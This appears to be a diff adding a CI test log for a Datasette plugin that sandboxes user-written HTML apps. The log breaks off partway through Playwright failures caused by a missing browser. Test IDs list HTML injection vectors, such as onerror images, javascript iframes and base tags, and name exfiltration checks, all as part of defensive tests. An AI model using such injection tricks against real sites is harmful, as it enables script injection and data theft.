@@ -1,0 +1,933 @@
+Downloading cpython-3.13.14-linux-x86_64-gnu (download) (33.4MiB)
+ Downloaded cpython-3.13.14-linux-x86_64-gnu (download)
+   Building datasette-apps @ file:///tmp/datasette-apps-igtvzs8k/datasette_apps-0.1a4.tar.gz
+Downloading pygments (1.2MiB)
+Downloading pip (1.7MiB)
+Downloading playwright (45.2MiB)
+Downloading pydantic-core (2.0MiB)
+ Downloaded pydantic-core
+ Downloaded playwright
+ Downloaded pygments
+ Downloaded pip
+      Built datasette-apps @ file:///tmp/datasette-apps-igtvzs8k/datasette_apps-0.1a4.tar.gz
+Installed 45 packages in 28ms
+============================= test session starts ==============================
+platform linux -- Python 3.13.14, pytest-9.1.1, pluggy-1.6.0 -- /home/runner/work/_temp/setup-uv-cache/builds-v0/.tmp7AaDOc/bin/python
+cachedir: .pytest_cache
+metadata: {'Python': '3.13.14', 'Platform': 'Linux-6.17.0-1018-azure-x86_64-with-glibc2.39', 'Packages': {'pytest': '9.1.1', 'pluggy': '1.6.0'}, 'Plugins': {'asyncio': '1.4.0', 'datasette': '1.0a37', 'json-report': '1.5.0', 'metadata': '3.1.1', 'anyio': '4.14.2'}, 'CI': 'true', 'JAVA_HOME': '/usr/lib/jvm/temurin-17-jdk-amd64'}
+rootdir: /tmp/datasette-apps-igtvzs8k/tagged-source
+configfile: pyproject.toml
+plugins: asyncio-1.4.0, datasette-1.0a37, json-report-1.5.0, metadata-3.1.1, anyio-4.14.2
+asyncio: mode=Mode.STRICT, debug=False, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
+collecting ... collected 186 items
+
+tests/test_agent_tools.py::test_app_edit_agent_tools_are_registered PASSED [  0%]
+tests/test_agent_tools.py::test_app_create_agent_tool_creates_new_app PASSED [  1%]
+tests/test_agent_tools.py::test_app_create_agent_tool_requires_create_permission PASSED [  1%]
+tests/test_agent_tools.py::test_app_str_replace_agent_tool_edits_app_html_revision PASSED [  2%]
+tests/test_agent_tools.py::test_app_edit_agent_tool_batches_edits_into_one_revision_and_renders PASSED [  2%]
+tests/test_agent_tools.py::test_app_edit_agent_tool_partial_failure_saves_nothing PASSED [  3%]
+tests/test_agent_tools.py::test_app_agent_tools_require_app_edit_permission PASSED [  3%]
+tests/test_agent_tools.py::test_app_agent_tool_rendered_links_respect_base_url PASSED [  4%]
+tests/test_agent_tools.py::test_app_create_agent_tool_rejects_disallowed_csp_origin PASSED [  4%]
+tests/test_agent_tools.py::test_app_create_agent_tool_allows_allowlisted_csp_origin PASSED [  5%]
+tests/test_agent_tools.py::test_app_create_agent_tool_allows_any_origin_with_permission PASSED [  5%]
+tests/test_agent_tools.py::test_app_create_schema_mentions_allowlist_when_configured PASSED [  6%]
+tests/test_agent_tools.py::test_app_create_schema_mentions_permission_when_no_allowlist PASSED [  6%]
+tests/test_apps.py::test_plugin_is_installed PASSED                      [  7%]
+tests/test_catalog_pagination.py::test_apps_index_paginates_with_next_cursor PASSED [  8%]
+tests/test_csp.py::test_build_csp_defaults_to_no_connect_src PASSED      [  8%]
+tests/test_csp.py::test_app_view_parent_csp_blocks_frame_navigation PASSED [  9%]
+tests/test_csp.py::test_build_csp_includes_exact_connect_origins PASSED  [  9%]
+tests/test_csp.py::test_build_csp_can_allow_insecure_origins_in_tests PASSED [ 10%]
+tests/test_csp.py::test_normalize_connect_origin_rejects_unsafe_origins[http://api.github.com] PASSED [ 10%]
+tests/test_csp.py::test_normalize_connect_origin_rejects_unsafe_origins[https://localhost:8000] PASSED [ 11%]
+tests/test_csp.py::test_normalize_connect_origin_rejects_unsafe_origins[https://127.0.0.1:8000] PASSED [ 11%]
+tests/test_csp.py::test_normalize_connect_origin_rejects_unsafe_origins[https://[::1]:8000] PASSED [ 12%]
+tests/test_csp.py::test_normalize_connect_origin_rejects_unsafe_origins[https://api.github.com/path] PASSED [ 12%]
+tests/test_csp.py::test_normalize_connect_origin_rejects_unsafe_origins[https://*.github.com] PASSED [ 13%]
+tests/test_csp.py::test_normalize_allowlist_origin_normalizes_bare_domains[cdn.jsdelivr.net-https://cdn.jsdelivr.net] PASSED [ 13%]
+tests/test_csp.py::test_normalize_allowlist_origin_normalizes_bare_domains[https://cdn.jsdelivr.net-https://cdn.jsdelivr.net] PASSED [ 14%]
+tests/test_csp.py::test_normalize_allowlist_origin_normalizes_bare_domains[https://cdn.jsdelivr.net/-https://cdn.jsdelivr.net] PASSED [ 15%]
+tests/test_csp.py::test_normalize_allowlist_origin_rejects_invalid_entries[https://*.github.com] PASSED [ 15%]
+tests/test_csp.py::test_normalize_allowlist_origin_rejects_invalid_entries[https://cdn.example.com/path] PASSED [ 16%]
+tests/test_csp.py::test_normalize_allowlist_origin_rejects_invalid_entries[localhost] PASSED [ 16%]
+tests/test_csp.py::test_normalize_allowlist_origin_rejects_invalid_entries[] PASSED [ 17%]
+tests/test_csp.py::test_configured_csp_allowlist_normalizes_dedupes_and_sorts PASSED [ 17%]
+tests/test_csp.py::test_configured_csp_allowlist_defaults_to_empty PASSED [ 18%]
+tests/test_csp.py::test_configured_csp_allowlist_raises_on_invalid_entry PASSED [ 18%]
+tests/test_csp.py::test_resolve_csp_origins_allows_any_origin_with_permission PASSED [ 19%]
+tests/test_csp.py::test_resolve_csp_origins_restricts_to_allowlist_without_permission PASSED [ 19%]
+tests/test_csp.py::test_resolve_csp_origins_denies_all_without_permission_or_allowlist PASSED [ 20%]
+tests/test_csp.py::test_resolve_csp_origins_preserves_existing_origins PASSED [ 20%]
+tests/test_csp.py::test_build_app_srcdoc_preserves_doctype_and_inserts_csp_first_in_head PASSED [ 21%]
+tests/test_csp.py::test_build_app_srcdoc_creates_head_if_missing PASSED  [ 22%]
+tests/test_csp.py::test_build_app_srcdoc_injects_datasette_query_bridge_after_csp PASSED [ 22%]
+tests/test_csp.py::test_iframe_bridge_reports_app_errors_to_parent PASSED [ 23%]
+tests/test_csp.py::test_iframe_bridge_reports_viewport_meta_once_after_dom_load PASSED [ 23%]
+tests/test_csp.py::test_iframe_bridge_intercepts_external_link_clicks PASSED [ 24%]
+tests/test_csp.py::test_iframe_bridge_noops_history_mutation_methods PASSED [ 24%]
+tests/test_csp.py::test_parent_bridge_renders_app_error_panel PASSED     [ 25%]
+tests/test_csp.py::test_parent_bridge_renders_app_log_panel PASSED       [ 25%]
+tests/test_csp.py::test_parent_bridge_mirrors_viewport_only_when_enabled PASSED [ 26%]
+tests/test_csp.py::test_parent_bridge_renders_external_link_modal PASSED [ 26%]
+tests/test_data_access.py::test_datasette_query_reads_from_allowed_database PASSED [ 27%]
+tests/test_data_access.py::test_datasette_query_allows_other_tables_in_allowed_database PASSED [ 27%]
+tests/test_data_access.py::test_datasette_query_denies_unallowed_database PASSED [ 28%]
+tests/test_data_access.py::test_datasette_query_denies_writes PASSED     [ 29%]
+tests/test_data_access.py::test_datasette_query_intersects_actor_permissions PASSED [ 29%]
+tests/test_data_access.py::test_datasette_query_accepts_named_parameters PASSED [ 30%]
+tests/test_data_access.py::test_datasette_query_allows_granted_views PASSED [ 30%]
+tests/test_data_access.py::test_datasette_stored_query_runs_allow_listed_query PASSED [ 31%]
+tests/test_data_access.py::test_datasette_stored_query_denies_unallow_listed_query PASSED [ 31%]
+tests/test_data_access.py::test_datasette_stored_query_intersects_actor_permissions PASSED [ 32%]
+tests/test_edit_controls.py::test_create_form_shows_access_data_and_network_controls PASSED [ 32%]
+tests/test_edit_controls.py::test_create_form_saves_access_data_and_network_controls PASSED [ 33%]
+tests/test_edit_controls.py::test_edit_form_shows_access_data_network_and_capability_controls PASSED [ 33%]
+tests/test_edit_controls.py::test_create_form_shows_database_link_and_table_preview PASSED [ 34%]
+tests/test_edit_controls.py::test_recent_stored_queries_endpoint_lists_newest_accessible_queries PASSED [ 34%]
+tests/test_edit_controls.py::test_edit_form_saves_sql_database_and_csp PASSED [ 35%]
+tests/test_edit_controls.py::test_edit_form_records_one_revision_for_one_save PASSED [ 36%]
+tests/test_edit_controls.py::test_edit_form_not_private_access_mode_allows_actor_with_view_app PASSED [ 36%]
+tests/test_edit_controls.py::test_create_form_hides_network_access_without_permission_or_allowlist PASSED [ 37%]
+tests/test_edit_controls.py::test_create_form_shows_allowlist_checkboxes_without_permission PASSED [ 37%]
+tests/test_edit_controls.py::test_create_form_shows_textarea_with_apps_set_csp_permission PASSED [ 38%]
+tests/test_edit_controls.py::test_create_post_rejects_origin_not_on_allowlist PASSED [ 38%]
+tests/test_edit_controls.py::test_create_post_accepts_allowlisted_origin PASSED [ 39%]
+tests/test_edit_controls.py::test_create_post_rejects_arbitrary_origin_without_allowlist PASSED [ 39%]
+tests/test_edit_controls.py::test_edit_form_shows_existing_out_of_list_origin_as_checkbox PASSED [ 40%]
+tests/test_edit_controls.py::test_edit_post_preserves_existing_out_of_list_origin PASSED [ 40%]
+tests/test_edit_controls.py::test_edit_post_can_remove_existing_origin PASSED [ 41%]
+tests/test_edit_controls.py::test_edit_post_rejects_new_arbitrary_origin_without_permission PASSED [ 41%]
+tests/test_edit_controls.py::test_edit_post_allows_arbitrary_origin_with_permission PASSED [ 42%]
+tests/test_jump.py::test_jump_lists_apps_the_actor_can_view PASSED       [ 43%]
+tests/test_llm_prompt.py::test_create_page_includes_copyable_llm_prompt_with_schema PASSED [ 43%]
+tests/test_llm_prompt.py::test_edit_page_prompt_has_selected_stored_query_metadata PASSED [ 44%]
+tests/test_llm_prompt.py::test_create_page_prompt_does_not_leak_hidden_schema PASSED [ 44%]
+tests/test_menu_links.py::test_apps_link_appears_in_datasette_menu_for_signed_in_actor PASSED [ 45%]
+tests/test_menu_links.py::test_apps_link_not_shown_to_anonymous_users PASSED [ 45%]
+tests/test_permissions.py::test_owner_can_view_and_edit_stored_app PASSED [ 46%]
+tests/test_permissions.py::test_owner_can_delete_stored_app_until_it_is_deleted PASSED [ 46%]
+tests/test_permissions.py::test_create_app_requires_explicit_permission_grant PASSED [ 47%]
+tests/test_permissions.py::test_create_app_allows_explicit_permission_grant PASSED [ 47%]
+tests/test_permissions.py::test_actors_with_view_app_can_view_external_apps PASSED [ 48%]
+tests/test_permissions.py::test_non_private_app_requires_view_app_permission PASSED [ 48%]
+tests/test_permissions.py::test_private_app_blocks_broad_view_app_permission PASSED [ 49%]
+tests/test_permissions.py::test_anonymous_can_view_non_private_app_if_permission_allows PASSED [ 50%]
+tests/test_permissions.py::test_edit_app_can_be_granted_to_non_owner_for_non_private_app PASSED [ 50%]
+tests/test_permissions.py::test_private_app_edit_delete_and_manage_access_remain_owner_only PASSED [ 51%]
+tests/test_permissions.py::test_routes_enforce_app_permissions PASSED    [ 51%]
+tests/test_permissions.py::test_shared_app_only_shows_edit_button_to_owner PASSED [ 52%]
+tests/test_permissions.py::test_apps_set_csp_is_denied_by_default PASSED [ 52%]
+tests/test_permissions.py::test_apps_set_csp_can_be_granted_via_config PASSED [ 53%]
+tests/test_pins_homepage.py::test_pin_routes_and_catalog_order PASSED    [ 53%]
+tests/test_pins_homepage.py::test_homepage_shows_three_recent_pinned_apps PASSED [ 54%]
+tests/test_pins_homepage.py::test_stored_app_view_includes_pin_controls PASSED [ 54%]
+tests/test_playwright.py::test_datasette_query_bridge_returns_data_to_iframe FAILED [ 55%]
+tests/test_playwright.py::test_replaced_iframe_document_cannot_use_global_query_messages FAILED [ 55%]
+tests/test_playwright.py::test_iframe_errors_render_in_parent_error_panel FAILED [ 56%]
+tests/test_playwright.py::test_iframe_logs_render_below_iframe_in_collapsed_parent_log_panel FAILED [ 56%]
+tests/test_playwright.py::test_iframe_link_click_shows_parent_confirmation_modal FAILED [ 57%]
+tests/test_playwright.py::test_fullscreen_parent_bridge_ui_uses_plugin_stylesheet FAILED [ 58%]
+tests/test_playwright.py::test_iframe_hash_link_click_runs_app_handler_without_parent_modal FAILED [ 58%]
+tests/test_playwright.py::test_malicious_apps_cannot_exfiltrate_to_external_origin FAILED [ 59%]
+tests/test_playwright.py::test_csp_allowlisted_origin_can_receive_exfiltrated_data FAILED [ 59%]
+tests/test_registry.py::test_registry_add_get_list_and_remove_external_app PASSED [ 60%]
+tests/test_registry.py::test_registry_search_uses_fts5 PASSED            [ 60%]
+tests/test_registry.py::test_registry_records_access_and_pins_apps PASSED [ 61%]
+tests/test_registry.py::test_registry_stores_sql_database_allow_list PASSED [ 61%]
+tests/test_registry.py::test_registry_stores_stored_query_allow_list PASSED [ 62%]
+tests/test_registry.py::test_registry_create_stored_app_and_save_versions PASSED [ 62%]
+tests/test_registry.py::test_registry_soft_deletes_stored_app_but_keeps_recoverable_rows PASSED [ 63%]
+tests/test_registry.py::test_registry_uses_app_revisions_delta_log_for_settings_changes PASSED [ 63%]
+tests/test_registry.py::test_revision_forward_fill_resolves_each_version_as_of_that_version PASSED [ 64%]
+tests/test_registry.py::test_revision_forward_fill_survives_many_single_field_edits PASSED [ 65%]
+tests/test_registry.py::test_revision_forward_fill_does_not_bleed_between_apps PASSED [ 65%]
+tests/test_registry.py::test_registry_records_data_and_network_access_revision_deltas PASSED [ 66%]
+tests/test_registry.py::test_ensure_tables_drops_old_app_versions_table PASSED [ 66%]
+tests/test_registry.py::test_ensure_tables_collapses_old_app_versions_to_one_revision PASSED [ 67%]
+tests/test_registry.py::test_ensure_tables_recovers_html_if_partial_revision_migration_exists PASSED [ 67%]
+tests/test_registry.py::test_ensure_tables_creates_placeholder_revision_for_apps_without_history PASSED [ 68%]
+tests/test_registry.py::test_ensure_tables_migrates_old_access_rows_to_is_private PASSED [ 68%]
+tests/test_routes.py::test_apps_index_lists_apps_with_view_app_permission PASSED [ 69%]
+tests/test_routes.py::test_create_view_and_edit_stored_app PASSED        [ 69%]
+tests/test_routes.py::test_delete_stored_app_hides_routes_but_keeps_revisions PASSED [ 70%]
+tests/test_routes.py::test_external_apps_cannot_be_soft_deleted_by_route PASSED [ 70%]
+tests/test_routes.py::test_revision_pages_show_non_html_changes_without_empty_diff PASSED [ 71%]
+tests/test_routes.py::test_capability_system_removed PASSED              [ 72%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[baseline-complete-document] PASSED [ 72%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[baseline-html-without-head] PASSED [ 73%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[baseline-doctype-fragment] PASSED [ 73%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[baseline-bare-fragment] PASSED [ 74%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-comment-fake-head] PASSED [ 74%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-title-fake-head] PASSED [ 75%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-textarea-fake-head] PASSED [ 75%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-script-text-fake-head] PASSED [ 76%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-style-fake-head] PASSED [ 76%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-noscript-fake-head] PASSED [ 77%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-xmp-fake-head] PASSED [ 77%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-attribute-fake-head] PASSED [ 78%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-conditional-comment-fake-head] PASSED [ 79%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[A-plaintext-fake-head] PASSED [ 79%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-script-before-head] PASSED [ 80%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-img-onerror-before-head] PASSED [ 80%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-meta-refresh-before-head] PASSED [ 81%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-base-before-head] PASSED [ 81%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-stylesheet-before-head] PASSED [ 82%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-svg-script-before-head] PASSED [ 82%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-iframe-javascript-before-head] PASSED [ 83%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-body-onload-before-head] PASSED [ 83%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[B-input-autofocus-before-head] PASSED [ 84%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[C-head-attribute-greater-than] PASSED [ 84%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[C-html-attribute-greater-than] PASSED [ 85%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[C-head-title-greater-than] PASSED [ 86%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[C-head-json-greater-than] PASSED [ 86%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[C-head-comment-end-attribute] PASSED [ 87%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[C-head-template-expression] PASSED [ 87%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[C-head-aria-greater-than] PASSED [ 88%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[D-uppercase-head] PASSED [ 88%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[D-multiline-head] PASSED [ 89%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[D-self-closing-head] PASSED [ 89%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[D-head-space] PASSED [ 90%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[D-double-head] PASSED [ 90%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[D-uppercase-html-head] PASSED [ 91%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[E-comment-fake-html] PASSED [ 91%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[E-title-fake-html] PASSED [ 92%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[E-html-attribute-greater-than] PASSED [ 93%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[E-script-before-html] PASSED [ 93%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[F-public-doctype] PASSED [ 94%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[F-system-doctype] PASSED [ 94%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[F-extra-space-doctype] PASSED [ 95%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[F-comment-before-doctype] PASSED [ 95%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[G-comment-img-attribute-head] PASSED [ 96%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[G-title-base-head] PASSED [ 96%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[G-public-doctype-script-img-attribute-head] PASSED [ 97%]
+tests/test_srcdoc_injection.py::test_srcdoc_security_tags_are_first_real_tags[G-plaintext-head-script] PASSED [ 97%]
+tests/test_templates.py::test_app_pages_extend_datasette_base_template PASSED [ 98%]
+tests/test_templates.py::test_app_pages_show_breadcrumbs_to_apps_list PASSED [ 98%]
+tests/test_templates.py::test_app_links_respect_base_url PASSED          [ 99%]
+tests/test_templates.py::test_apps_list_marks_private_apps PASSED        [100%]
+
+=================================== FAILURES ===================================
+______________ test_datasette_query_bridge_returns_data_to_iframe ______________
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_datasette_query_bridge_re0')
+
+    def test_datasette_query_bridge_returns_data_to_iframe(tmp_path):
+        content_db_path = tmp_path / "content.db"
+        _create_content_database(content_db_path)
+        server = DatasetteServer(tmp_path, files=[content_db_path])
+        app = asyncio.run(
+            server.create_app(
+                """<!doctype html>
+    <p id="result">waiting</p>
+    <script>
+    (async function() {
+      const result = await datasette.query(
+        "content",
+        "select name, score from items order by score desc"
+      );
+      document.getElementById("result").textContent = JSON.stringify(result.rows);
+    })();
+    </script>""",
+                name="Query bridge",
+                sql_databases=["content"],
+            )
+        )
+    
+>       with server, _browser_page() as page:
+                     ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:489: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f46180f5940>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4616a40f40>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+________ test_replaced_iframe_document_cannot_use_global_query_messages ________
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_replaced_iframe_document_0')
+
+    def test_replaced_iframe_document_cannot_use_global_query_messages(tmp_path):
+        # This is a defense-in-depth regression for the old global postMessage()
+        # bridge. If the iframe document is replaced after the real app loads, the
+        # replacement document still has the same iframe contentWindow. The old
+        # parent bridge trusted that window identity alone, so this fake document
+        # could ask the parent to run app-scoped SQL.
+        content_db_path = tmp_path / "content.db"
+        _create_content_database(content_db_path)
+        server = DatasetteServer(tmp_path, files=[content_db_path])
+        app = asyncio.run(
+            server.create_app(
+                """<!doctype html>
+    <p id="ready">original app</p>
+    <script>
+    datasette.query("content", "select 1 as ok");
+    </script>""",
+                name="Replaced iframe bridge",
+                sql_databases=["content"],
+            )
+        )
+    
+>       with server, _browser_page() as page:
+                     ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:521: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f4616a07ed0>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4616a25300>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
+E           ║ Looks like Playwright was just installed or updated.       ║
+E           ║ Please run the following command to download new browsers: ║
+E           ║                                                            ║
+E           ║     playwright install                                     ║
+E           ║                                                            ║
+E           ║ <3 Playwright Team                                         ║
+E           ╚════════════════════════════════════════════════════════════╝
+
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:563: Error
+_______________ test_iframe_errors_render_in_parent_error_panel ________________
+
+tmp_path = PosixPath('/tmp/pytest-of-runner/pytest-0/test_iframe_errors_render_in_p0')
+
+    def test_iframe_errors_render_in_parent_error_panel(tmp_path):
+        server = DatasetteServer(tmp_path)
+        app = asyncio.run(
+            server.create_app(
+                """<!doctype html>
+    <p>App with an error</p>
+    <script>
+    console.error("Playwright saw this app error");
+    </script>""",
+                name="Error bridge",
+            )
+        )
+    
+>       with server, _browser_page() as page:
+                     ^^^^^^^^^^^^^^^
+
+tests/test_playwright.py:595: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/home/runner/work/_temp/uv-python-dir/cpython-3.13.14-linux-x86_64-gnu/lib/python3.13/contextlib.py:141: in __enter__
+    return next(self.gen)
+           ^^^^^^^^^^^^^^
+tests/test_playwright.py:195: in _browser_page
+    browser = browser_type.launch(**launch_kwargs)
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/sync_api/_generated.py:16515: in launch
+    self._sync(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_browser_type.py:97: in launch
+    await self._channel.send(
+/home/runner/work/_temp/setup-uv-cache/archive-v0/pbEzsDlD_H-J2_Np/lib/python3.13/site-packages/playwright/_impl/_connection.py:69: in send
+    return await self._connection.wrap_api_call(
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = <playwright._impl._connection.Connection object at 0x7f46168e9bd0>
+cb = <function Channel.send.<locals>.<lambda> at 0x7f4616a0c540>
+is_internal = False, title = None
+
+    async def wrap_api_call(
+        self, cb: Callable[[], Any], is_internal: bool = False, title: str = None
+    ) -> Any:
+        if self._api_zone.get():
+            return await cb()
+        task = asyncio.current_task(self._loop)
+        st: List[inspect.FrameInfo] = getattr(
+            task, "__pw_stack__", None
+        ) or inspect.stack(0)
+    
+        parsed_st = _extract_stack_trace_information_from_stack(st, is_internal, title)
+        self._api_zone.set(parsed_st)
+        try:
+            return await cb()
+        except Exception as error:
+>           raise rewrite_error(error, f"{parsed_st['apiName']}: {error}") from None
+E           playwright._impl._errors.Error: BrowserType.launch: Executable doesn't exist at /home/runner/.cache/ms-playwright/chromium_headless_shell-1228/chrome-headless-shell-linux64/chrome-headless-shell
+E           ╔════════════════════════════════════════════════════════════╗
